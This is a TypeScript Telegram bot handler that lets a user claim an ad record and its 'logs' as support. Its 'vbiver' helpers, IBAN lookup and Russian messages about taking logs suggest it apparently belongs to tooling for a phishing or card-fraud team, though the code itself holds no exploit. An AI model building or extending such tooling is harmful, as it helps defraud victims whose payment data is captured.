import {Context} from "@/database/models/context";
import {Composer} from "grammy";
import {adsRepository, logsRepository} from "@/database";

import {notificationBot} from "@/utils/bot";
import {createVbiverMenu} from "@/helpers/vbiver/createVbiverMenu";
import {createVbiverText} from "@/helpers/vbiver/createVbiverText";
import {getUsername} from "@/helpers/getUsername";
import {getIBANinfo, IBANinfo} from "@/utils/IBANinfo";
import {UserRole} from "@/database/models/user";
import {config} from "@/utils/config";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";
import console from "console";

const regex = /^ad support set (?<order>\d+)/gmsi
export const composer = new Composer<Context>()
composer.callbackQuery(regex, callbackHandler)

async function callbackHandler(ctx: Context)  {
    const match = regex.exec(ctx.match[0])

    const ad = await adsRepository.findOne({
        where: {
            id: Number(match.groups.order)
        },
        relations: ["support"]
    })

    if (ad.support && Number(ad?.support?.tgId) === ctx.from.id) {
        return ctx.answerCallbackQuery({
            text: '🙈 Нельзя забирать логи у самого ж себя!',
            show_alert: true
        })
    }

    try {
        await ctx.editMessageReplyMarkup({
            reply_markup: {
                inline_keyboard: [
                    [{text: `${ctx.from.first_name}` , url: "tg://user?id=" + ctx.from.id}],
                    [{text: `Забрать` , callback_data: `ad support set ${match.groups.order}`}]
                ]
            }
        })
    } catch (e) {}

    if (!ad) return ctx.deleteMessage()

    ad.support = ctx.user
    return await adsRepository.save(ad)
}